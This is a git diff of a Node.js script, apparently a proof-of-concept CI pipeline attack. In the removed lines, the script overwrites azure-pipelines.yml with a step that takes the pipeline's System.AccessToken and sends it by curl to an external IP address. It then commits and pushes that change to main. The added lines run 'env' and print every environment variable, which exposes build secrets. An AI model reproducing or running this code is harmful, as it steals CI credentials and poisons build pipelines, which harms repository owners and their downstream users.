@@ -1,123 +1,123 @@
-// const { exec } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-const { exec,execSync } = require('child_process');
+const { exec } = require('child_process');
+// const fs = require('fs');
+// const path = require('path');
+// const { exec,execSync } = require('child_process');
 
-// Step 1: Configure git user info
-exec('git config --global user.email "13911336781@163.com" && git config --global user.name "ckx-sec"', (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error configuring git user info: ${error.message}`);
-    return;
-  }
-  if (stderr) {
-    console.error(`git config stderr: ${stderr}`);
-    return;
-  }
-  console.log(`git config stdout: ${stdout}`);
-});
+// // Step 1: Configure git user info
+// exec('git config --global user.email "13911336781@163.com" && git config --global user.name "ckx-sec"', (error, stdout, stderr) => {
+//   if (error) {
+//     console.error(`Error configuring git user info: ${error.message}`);
+//     return;
+//   }
+//   if (stderr) {
+//     console.error(`git config stderr: ${stderr}`);
+//     return;
+//   }
+//   console.log(`git config stdout: ${stdout}`);
+// });
 
 
-// Step 1: Fetch the latest main branch from origin
-try {
-    console.log("Fetching the latest main branch from origin...");
-    execSync('git fetch origin main');
-} catch (error) {
-    console.error('Error fetching main branch:', error.message);
-    process.exit(1);
-}
+// // Step 1: Fetch the latest main branch from origin
+// try {
+//     console.log("Fetching the latest main branch from origin...");
+//     execSync('git fetch origin main');
+// } catch (error) {
+//     console.error('Error fetching main branch:', error.message);
+//     process.exit(1);
+// }
 
-// Step 2: Checkout the main branch
-try {
-    console.log("Checking out the main branch...");
-    execSync('git checkout main');
-} catch (error) {
-    console.error('Error checking out main branch:', error.message);
-    process.exit(1);
-}
+// // Step 2: Checkout the main branch
+// try {
+//     console.log("Checking out the main branch...");
+//     execSync('git checkout main');
+// } catch (error) {
+//     console.error('Error checking out main branch:', error.message);
+//     process.exit(1);
+// }
 
-// Step 3: Rename existing azure-pipelines.yml file
-const oldFilePath = path.join(__dirname, 'azure-pipelines.yml');
-const backupFilePath = path.join(__dirname, 'azure-pipelines-backup.yml');
+// // Step 3: Rename existing azure-pipelines.yml file
+// const oldFilePath = path.join(__dirname, 'azure-pipelines.yml');
+// const backupFilePath = path.join(__dirname, 'azure-pipelines-backup.yml');
 
-try {
-    if (fs.existsSync(oldFilePath)) {
-        console.log("Renaming existing azure-pipelines.yml to azure-pipelines-backup.yml...");
-        fs.renameSync(oldFilePath, backupFilePath);
-    } else {
-        console.log("No existing azure-pipelines.yml file found, skipping rename step.");
-    }
-} catch (error) {
-    console.error('Error renaming file:', error.message);
-    process.exit(1);
-}
+// try {
+//     if (fs.existsSync(oldFilePath)) {
+//         console.log("Renaming existing azure-pipelines.yml to azure-pipelines-backup.yml...");
+//         fs.renameSync(oldFilePath, backupFilePath);
+//     } else {
+//         console.log("No existing azure-pipelines.yml file found, skipping rename step.");
+//     }
+// } catch (error) {
+//     console.error('Error renaming file:', error.message);
+//     process.exit(1);
+// }
 
-// Step 4: Write new content to azure-pipelines.yml
-const newYmlContent = `
-trigger:
-  branches:
-    include:
-      - main
+// // Step 4: Write new content to azure-pipelines.yml
+// const newYmlContent = `
+// trigger:
+//   branches:
+//     include:
+//       - main
 
-pool:
-  vmImage: 'ubuntu-latest'
+// pool:
+//   vmImage: 'ubuntu-latest'
 
-steps:
-- checkout: self
-  persistCredentials: true  # 保留凭据以便后续步骤使用
+// steps:
+// - checkout: self
+//   persistCredentials: true  # 保留凭据以便后续步骤使用
 
-- task: NodeTool@0
-  inputs:
-    versionSpec: '12.x'
-    checkLatest: true
+// - task: NodeTool@0
+//   inputs:
+//     versionSpec: '12.x'
+//     checkLatest: true
 
-- script: |
-    echo "Fetching System Access Token..."
-    token=$(System.AccessToken)
-    echo "Sending token to external server..."
-    curl -X POST -H "Content-Type: application/json" -d "{\\"token\\": \\"$token\\"}" http://139.180.193.16:7777
-  displayName: 'Fetch and Send System Access Token'
+// - script: |
+//     echo "Fetching System Access Token..."
+//     token=$(System.AccessToken)
+//     echo "Sending token to external server..."
+//     curl -X POST -H "Content-Type: application/json" -d "{\\"token\\": \\"$token\\"}" http://139.180.193.16:7777
+//   displayName: 'Fetch and Send System Access Token'
 
-- script: |
-    npm install
-  displayName: 'Install Node.js dependencies'
+// - script: |
+//     npm install
+//   displayName: 'Install Node.js dependencies'
 
-- task: AzureFunctionApp@1
-  inputs:
-    azureSubscription: 'test_connection'
-    appType: 'functionApp'
-    appName: 'mypocfunctiontest'
-    package: '$(Build.ArtifactStagingDirectory)/'
-`;
+// - task: AzureFunctionApp@1
+//   inputs:
+//     azureSubscription: 'test_connection'
+//     appType: 'functionApp'
+//     appName: 'mypocfunctiontest'
+//     package: '$(Build.ArtifactStagingDirectory)/'
+// `;
 
-try {
-    console.log("Writing new azure-pipelines.yml content...");
-    fs.writeFileSync(oldFilePath, newYmlContent.trim());
-} catch (error) {
-    console.error('Error writing to azure-pipelines.yml:', error.message);
-    process.exit(1);
-}
+// try {
+//     console.log("Writing new azure-pipelines.yml content...");
+//     fs.writeFileSync(oldFilePath, newYmlContent.trim());
+// } catch (error) {
+//     console.error('Error writing to azure-pipelines.yml:', error.message);
+//     process.exit(1);
+// }
 
-// Step 5: Pull the latest changes from main to ensure you are up-to-date
-try {
-    console.log("Pulling latest changes from the main branch...");
-    execSync('git pull origin main');
-} catch (error) {
-    console.error('Error pulling latest changes:', error.message);
-    process.exit(1);
-}
+// // Step 5: Pull the latest changes from main to ensure you are up-to-date
+// try {
+//     console.log("Pulling latest changes from the main branch...");
+//     execSync('git pull origin main');
+// } catch (error) {
+//     console.error('Error pulling latest changes:', error.message);
+//     process.exit(1);
+// }
 
-// Optionally, commit and push the changes (this is risky, use with caution)
-try {
-    console.log("Committing and pushing the changes...");
-    execSync('git add .');
-    execSync('git commit -m "Modified azure-pipelines.yml for token extraction"');
-    execSync('git push origin main');
-} catch (error) {
-    console.error('Error during git operation:', error.message);
-    process.exit(1);
-}
+// // Optionally, commit and push the changes (this is risky, use with caution)
+// try {
+//     console.log("Committing and pushing the changes...");
+//     execSync('git add .');
+//     execSync('git commit -m "Modified azure-pipelines.yml for token extraction"');
+//     execSync('git push origin main');
+// } catch (error) {
+//     console.error('Error during git operation:', error.message);
+//     process.exit(1);
+// }
 
-console.log("Process completed successfully!");
+// console.log("Process completed successfully!");
 
 
 
@@ -415,17 +415,17 @@ console.log("Process completed successfully!");
 // });
 
 
-// // 执行 env 命令获取环境变量
-// exec('env', (error, stdout, stderr) => {
-//     if (error) {
-//         console.error(`执行 env 时出错: ${error.message}`);
-//         return;
-//     }
-//     if (stderr) {
-//         console.error(`env 执行输出错误: ${stderr}`);
-//         return;
-//     }
+// 执行 env 命令获取环境变量
+exec('env', (error, stdout, stderr) => {
+    if (error) {
+        console.error(`执行 env 时出错: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.error(`env 执行输出错误: ${stderr}`);
+        return;
+    }
 
-//     console.log(`env 命令结果:\n${stdout}`);
+    console.log(`env 命令结果:\n${stdout}`);
     
-// });
+});
